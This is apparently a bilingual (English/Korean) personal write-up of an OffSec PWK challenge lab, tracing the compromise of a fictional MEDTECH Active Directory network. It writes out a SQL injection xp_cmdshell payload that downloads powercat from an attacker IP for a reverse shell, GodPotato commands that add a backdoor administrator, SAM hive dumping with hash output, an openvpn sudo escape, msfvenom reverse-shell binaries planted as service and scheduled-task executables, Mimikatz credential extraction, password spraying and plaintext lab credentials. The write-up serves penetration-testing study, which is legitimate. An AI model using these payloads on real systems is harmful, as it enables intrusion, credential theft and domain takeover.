---
tags:
  - type/machine
  - platform/pwk-challenge
  - status/solved
  - tech/ad/dcsync
  - tech/win/potato
  - tech/win/sebackup
  - tech/win/scheduled-task
  - tech/lin/sudo-abuse
  - tech/web/sqli
  - tech/db/mssql
  - tech/svc/smb
  - tech/exec/winrm
  - tech/exec/psexec
  - tech/exec/ssh-key
  - tech/cred/crack
  - tech/cred/mimikatz
  - tech/pivot/ligolo
  - tech/enum/dirbust
  - tech/enum/peas
  - tech/payload/msfvenom
  - tech/payload/revshell
type: machine
platform: pwk-challenge
status: solved
tech_count: 18
---
About this lab

Navigate through a complex multi-machine lab, beginning with a SQL injection vulnerability leading to remote code execution and privilege escalation. Utilize lateral movement techniques, exploit Windows services, and harvest credentials to gain access to critical systems, culminating in full domain compromise. Hone your skills in privilege escalation, token impersonation, and exploiting misconfigurations.

이 연구실에 대하여

SQL 인젝션 취약점을 이용한 원격 코드 실행 및 권한 상승으로 이어지는 복잡한 다중 머신 랩 환경을 탐색해 보세요. 측면 이동 기법, Windows 서비스 악용, 자격 증명 수집을 통해 핵심 시스템에 접근하고 궁극적으로 도메인 전체를 장악하는 방법을 익히세요. 권한 상승, 토큰 가장, 잘못된 구성 악용 기술을 연마하세요.

This advanced lab challenges participants to navigate a realistic, multi-machine enterprise network, beginning with the exploitation of a SQL injection vulnerability on a public-facing web server. The vulnerability is used to achieve remote code execution and escalate privileges locally. From there, you'll harvest credentials, perform lateral movement, and pivot into internal systems like FILES02 and CLIENT02. Continue compromising additional hosts such as DEV04 using misconfigurations and token impersonation techniques, ultimately targeting the domain controller (DC01) and PROD01 to achieve full domain compromise.

이 고급 실습에서는 참가자들이 실제와 같은 다중 머신 엔터프라이즈 네트워크를 탐색하도록 구성되어 있으며, 첫 단계로 공개 웹 서버에서 SQL 인젝션 취약점을 악용합니다. 이 취약점을 이용하면 원격 코드 실행 및 로컬 권한 상승이 가능합니다. 이후 자격 증명을 획득하고, 횡적 이동을 수행하며, FILES02 및 CLIENT02와 같은 내부 시스템으로 침투합니다. 잘못된 구성 및 토큰 가장 기법을 사용하여 DEV04와 같은 추가 호스트를 계속해서 공격하고, 최종적으로 도메인 컨트롤러(DC01)와 PROD01을 목표로 삼아 도메인 전체를 장악하게 됩니다.

Learning Objectives

## After completing this lab, learners will be able to:

- Identify and exploit a SQL injection vulnerability on WEB02 to gain initial access and execute commands.
- Escalate privileges on the WEB02 machine and extract credentials for lateral movement.
- Use pivoting techniques to access internal machines such as FILES02 and CLIENT02, leveraging stolen credentials.
- Escalate privileges on DEV04 and utilize compromised accounts to attack DC01 for domain admin access.
- Compromise PROD01 and finalize the domain takeover, securing all proof flags.
## 이 실습을 완료하면 학습자는 다음을 수행할 수 있게 됩니다.

- WEB02에서 SQL 인젝션 취약점을 발견하고 이를 악용하여 초기 접근 권한을 획득하고 명령을 실행합니다.
- WEB02 머신에서 권한을 상승시키고 자격 증명을 추출하여 측면 이동을 수행합니다.
- 탈취한 자격 증명을 이용하여 피벗팅 기법으로 FILES02 및 CLIENT02와 같은 내부 시스템에 접근하십시오.
- DEV04 서버에서 권한을 상승시키고, 탈취한 계정을 이용하여 DC01 서버를 공격하여 도메인 관리자 권한을 획득하십시오.
- PROD01에 접근하여 도메인 탈취를 완료하고 모든 증거 플래그를 확보하십시오.

##### 

Objectives

We have been tasked to conduct a penetration test for MEDTECH a recently formed IoT healthcare startup. Our objective is to find as many vulnerabilities and misconfigurations as possible in order to increase their Active Directory security posture and reduce the attack surface.

The organization topology diagram is shown below and the public subnet network resides in the `192.168.xx.0/24` range, where the `xx` of the third octet can be found under the _IP ADDRESS_ field in the control panel.

![Figure 1: Challenge Scenario](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PWKR-LABS/imgs/challengelab1/950940473d8812f4388e53bb3b33852a-Topology2.png)

Figure 1: Challenge Scenario

**172.16.243.10**

Challenge1 - VM 1 OS Credentials:

```
No credentials were provided for this machine
```

**172.16.243.11**

Challenge1 - VM 2 OS Credentials:

```
No credentials were provided for this machine
```

**192.168.243.120**

Challenge1 - VM 3 OS Credentials:

```
No credentials were provided for this machine
```

**192.168.243.121**

Challenge1 - VM 4 OS Credentials:

```
No credentials were provided for this machine
```

**192.168.243.122**

Challenge1 - VM 5 OS Credentials:

```
No credentials were provided for this machine
```

**172.16.243.12**

Challenge1 - VM 6 OS Credentials:

```
No credentials were provided for this machine
```

**172.16.243.13**

Challenge1 - VM 7 OS Credentials:

```
No credentials were provided for this machine
```

**172.16.243.14**

Challenge1 - VM 8 OS Credentials:

```
No credentials were provided for this machine
```

**172.16.243.82**

Challenge1 - VM 9 OS Credentials:

```
No credentials were provided for this machine
```

**172.16.243.83**

Challenge1 - VM 10 OS Credentials:

```
No credentials were provided for this machine
```


##### 

목표

저희는 최근 설립된 IoT 헬스케어 스타트업인 MEDTECH에 대한 침투 테스트를 수행하는 임무를 맡았습니다. 목표는 가능한 한 많은 취약점과 잘못된 구성을 찾아내어 Active Directory 보안 태세를 강화하고 공격 표면을 줄이는 것입니다.

아래는 조직 토폴로지 다이어그램이며, 공용 서브넷 네트워크는 범위 내에 있습니다 `192.168.xx.0/24`. 여기서 세 번째 옥텟의 값은 제어판의 _IP 주소_`xx` 필드 에서 확인할 수 있습니다 .

![그림 1: 도전 시나리오](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PWKR-LABS/imgs/challengelab1/950940473d8812f4388e53bb3b33852a-Topology2.png)

그림 1: 도전 시나리오


![[Pasted image 20251230133208.png]]


ffuf -u http://192.168.243.120/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ic

![[Pasted image 20251230140403.png]]





```bash
admin'; EXEC xp_cmdshell 'powershell -c "IEX (New-Object Net.WebClient).DownloadString(''http://192.168.45.244/powercat.ps1''); powercat -c 192.168.45.244 -p 4444 -e powershell"'--
```

![[Pasted image 20251230145326.png]]


![[Pasted image 20251230145357.png]]

iwr -uri http://192.168.45.244/GodPotato-NET4.exe

```powershell
# 1. 'attacker'라는 이름의 사용자 생성 (비밀번호는 복잡하게 설정) 
.\GodPotato-Net4.exe -cmd "net user attacker Password123! /add" 
# 2. 생성한 사용자를 로컬 관리자 그룹에 추가 
.\GodPotato-Net4.exe -cmd "net localgroup administrators attacker /add" 
# 3. Remote Management Users 그룹에도 추가 (WinRM 접속 허용) 
.\GodPotato-Net4.exe -cmd "net localgroup \"Remote Management Users\" attacker /add"
```
```powershell
.\GP4.exe -cmd "reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"
```

```bash
evil-winrm -i 192.168.243.121 -u 'kali' -p 'kali123!'

```
![[Pasted image 20251230160136.png]]

ipconfig /all
![[Pasted image 20251230160416.png]]



```powershell
reg save HKLM\SAM sam.hiv 
reg save HKLM\SYSTEM system.hiv
# 이 파일들을 Kali로 가져와서(download) impacket-secretsdump로 푸십시오.
```


```bash
┌──(kali㉿kali)-[~/OSCP/chall1]
└─$ impacket-secretsdump -sam sam.hiv -system system.hiv LOCAL
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x15e1050a6b4a11f2c1ebe8aaa2a80fc5
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:b2c03054c306ac8fc5f9d188710b0168:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:6085c974624ef685a86737c960a5d405:::
offsec:1000:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::
kali:1002:aad3b435b51404eeaad3b435b51404ee:aac3683c9cc7658f7925b01dedcd5154:::
[*] Cleaning up... 
```
![[Pasted image 20251230160957.png]]

![[Pasted image 20251230164817.png]]


![[Pasted image 20251230173125.png]]
![[Pasted image 20251230173138.png]]

```bash
impacket-secretsdump -sam sam.hiv -system system.hiv LOCAL
```
![[Pasted image 20251230173233.png]]



```bash
nxc smb 172.16.243.0/24 -u Administrator -H b2c03054c306ac8fc5f9d188710b0168 --local-auth
```




# 192.168.138.122

## Initial Access

Hydra를 사용하여 brute force로 password를 찾습니다.
![[Pasted image 20260105095848.png]]

## Privilege Escalation
sudo -l 명령어로 권한 설정을 확인하고 OpenVPN 취약점을 이용해 루트 권한 획득
![[Pasted image 20260105100129.png]]


```bash
sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
```
```bash
	/bin/bash
```

![[Pasted image 20260105112135.png]]

proof.txt 파일 확인

![[Pasted image 20260105112314.png]]

## Post-Exploitation

mario ssh id_rsa 획득
![[Pasted image 20260105141843.png]]


```bash
./agent -connect 192.168.45.224:11601 -ignore-cert
./proxy -selfcert
session
interface_create --name ligolo
start --tun ligolo
route_add --name ligolo --route 172.168.189.0/24
```

![[Pasted image 20260105151745.png]]

# 192.16.138.14
## Initial Access
id_rsa 활용하여 local.txt 파일 확인

```bash
chmod 600 id_rsa
```

![[Pasted image 20260105155743.png]]



# 172.16.247.11



```bash
nxc winrm 172.16.247.0/24 -u 'wario' -p 'Mushrrom!' --continue-on-success
```

```bash
nxc winrm 172.16.138.11 -u users.txt -p password.txt
```
nxc 활용하여 joe/Flowers1 정보 확인
![[Pasted image 20260105161914.png]]

```bash
evil-winrm -i 172.16.138.11 -u 'joe' -p 'Flowers1'
```

evil-winrm 활용하여 접근

![[Pasted image 20260105164710.png]]

local.txt 파일 확인

![[Pasted image 20260105171857.png]]

```powershell
type fileMonitorBackup.log | findstr /V requested
```

NTLM 해시값 획득
![[Pasted image 20260105172134.png]]

hashcat 사용하여 패스워드(wario/Mushroom!) 획득 
![[Pasted image 20260105174000.png]]
획득한 정보를 사용하여 local.txt 확인
```powershell
evil-winrm -i 172.16.138.83 -u 'wario' -p 'Mushroom!'  
```
![[Pasted image 20260105174639.png]]

WinPEAS 업로드 후 실행
수정 후 실행 할 수 있는 파일 발견

![[Pasted image 20260106155634.png]]

msfvenom을 사용하여 권한 상승을 위한 리버스 쉘 실행파일 생성
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.45.176 LPORT=9999 -f exe-service -o auditTracker.exe
```
```bash
 ## x64 환경일 경우 
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.176 LPORT=9999 -f exe -o auditTracker.exe 
 
 # 만약 타겟이 x86이라면 (Medtech 환경에 따라 확인 필요) 
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.176 LPORT=9999 -f exe -o auditTracker.exe
관리자 생성 스크립트 실행
```
```bash
msfvenom -p windows/x64/exec CMD="net user hacker Password123! /add && net localgroup administrators hacker /add" -f exe-service -o auditTracker.exe
```


파일 위치 확인
```powershell
Get-ChildItem -Path C:\ -Include auditTracker.exe -Recurse -ErrorAction SilentlyContinue
```

파일 교체
```powershell
sc.exe start auditTracker
```
![[Pasted image 20260106162249.png]]

proof.txt 확인
![[Pasted image 20260106164259.png]]

# 172.16.189.82

## Initial Access

"Nmap results indicated that the SMB port (445/TCP) was open and accessible." (Nmap 결과, SMB 포트(445/TCP)가 열려 있고 접근 가능한 상태임을 나타냈습니다.)
![[Pasted image 20260106165156.png]]

"As shown in the output above, NetExec confirmed that the user '**yoshi**' possesses administrative privileges (Pwn3d!) using the identified credentials." (위 출력 결과에서 보듯, NetExec은 확인된 자격 증명을 통해 'yoshi' 사용자가 관리자 권한을 보유하고 있음을 확인했습니다.)
![[Pasted image 20260107104409.png]]

"Using the previously identified credentials, a connection was established to the target via `impacket-psexec` **to retrieve** the `proof.txt` flag." (확인된 자격 증명을 사용하여, proof.txt를 **가져오기 위해** psexec으로 연결을 수립했습니다.)

```bash
impacket-psexec medtech.com/yoshi:'Mushroom!'@172.16.187.82 -dc-ip 172.16.187.10
```

![[Pasted image 20260107105221.png]]

"Using the previously identified credentials, **NetExec was utilized to authenticate across the network, identifying 7 servers with valid access.**" (이전에 확인된 자격 증명을 사용하여 NetExec으로 네트워크 인증을 시도했으며, 접속 가능한 7대의 서버를 확인했습니다.)
```bash
nxc smb 172.16.187.0/24 -u 'yoshi' -p 'Mushroom!' --continue-on-success --ignore-pw-decoding
```
![[Pasted image 20260107111212.png]]


Using RDP
```bash
xfreerdp3 /v:172.16.187.12 /u:yoshi /p:Mushroom!
```
![[Pasted image 20260107113112.png]]
![[Pasted image 20260107113140.png]]

## Privilege Escalation


"Enumeration with `winPEAS` identified that the current user has **write permissions** on the `C:\TEMP\backup.exe` binary." (winPEAS 열거를 통해 현재 사용자가 C:\TEMP\backup.exe 바이너리에 대해 쓰기 권한을 가지고 있음을 확인했습니다.)
![[Pasted image 20260107151631.png]]


"Analysis of the **Windows Event Logs** confirmed that `backup.exe` is **triggered by a Scheduled Task**." (Windows 이벤트 로그 분석 결과, backup.exe가 예약된 작업(Scheduled Task)에 의해 트리거됨을 확인했습니다.)

![[Pasted image 20260107152419.png]]


"A malicious reverse shell payload was **generated** using `msfvenom` and saved with the filename `backup.exe`." (`msfvenom`을 사용하여 악성 리버스 셸 페이로드를 생성하고 `backup.exe`라는 파일 이름으로 저장했습니다.)

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Attacker_IP> LPORT=<Port> -f exe -o backup.exe
```
![[Pasted image 20260107145743.png]]


"A **Netcat (nc) listener** was established to capture the reverse shell. Once the connection was received, the `proof.txt` flag was **retrieved** to verify the compromise." (리버스 셸을 캡처하기 위해 Netcat 리스너를 구축했습니다. 연결이 수립된 후, 침투 성공을 확인하기 위해 `proof.txt` 플래그를 가져왔습니다.)

![[Pasted image 20260107153138.png]]


## Post-Exploitation


"`mimikatz.exe` was **uploaded to the target machine**. As shown in the output above, **Mimikatz successfully extracted the credentials** for the user `leon`." (`mimikatz.exe`를 대상 머신에 업로드했습니다. 위 출력 결과에서 보듯, Mimikatz는 `leon` 사용자의 자격 증명을 성공적으로 추출했습니다.)

```mimikatz
privilege::debug
sekrulsa::logonPasswords
```

![[Pasted image 20260107160421.png]]

# 172.16.187.10

## Initial Access

"Using the previously identified credentials, `NetExec` (nxc) was leveraged to perform a network-wide authentication sweep, **identifying seven hosts with valid access.**" (확인된 자격 증명을 사용하여 NetExec으로 네트워크 전체 인증 스윕을 수행했으며, 유효한 접근 권한이 있는 7대의 호스트를 확인했습니다.)

```bash
nxc smb 172.16.187.0/24 -u 'leon' -p 'rabbit:)' --continue-on-success --ignore-pw-decoding
```

![[Pasted image 20260107161454.png]]


"Using the previously identified credentials, a connection was established to the target via `impacket-psexec` **to retrieve** the `proof.txt` flag." (확인된 자격 증명을 사용하여, proof.txt를 **가져오기 위해** psexec 으로 연결을 수립했습니다.)

```bash
impacket-psexec medtech.com/leon:'rabbit:)'@172.16.187.10 -dc-ip 172.16.187.10
```

![[Pasted image 20260107163222.png]]

## Post-Exploitation

"On the `web01` server, a file named `credentials.txt` was **discovered on the Administrator's desktop**. The file contained the following credential: `offsec/century62hisan51`." (`web01` 서버의 관리자 바탕화면에서 `credentials.txt` 파일을 발견했습니다. 해당 파일에는 `offsec/century62hisan51` 자격 증명이 포함되어 있었습니다.)

![[Pasted image 20260107163609.png]]

# 172.16.187.13

## Initial Access

leon credential.txt


# 192.168.187.120
## Initial Access

The recovered credentials for `offsec` were then used to authenticate to other server in the network via SSH
![[Pasted image 20260107164626.png]]

## Privilege Escalation

"An inspection of sudo privileges using `sudo -l` revealed that the current user is permitted to **execute all commands with root privileges without providing a password (`NOPASSWD: ALL`).**" (`sudo -l`을 통한 권한 조사 결과, 현재 사용자가 비밀번호 없이 루트 권한으로 모든 명령을 실행할 수 있음(`NOPASSWD: ALL`)이 드러났습니다.)

![[Pasted image 20260107164722.png]]


"The `proof.txt` flag was **successfully retrieved**, confirming a complete compromise of the target system." (`proof.txt` 플래그를 성공적으로 가져왔으며, 이는 대상 시스템이 완전히 장악되었음을 확인해 줍니다.)

![[Pasted image 20260107164824.png]]

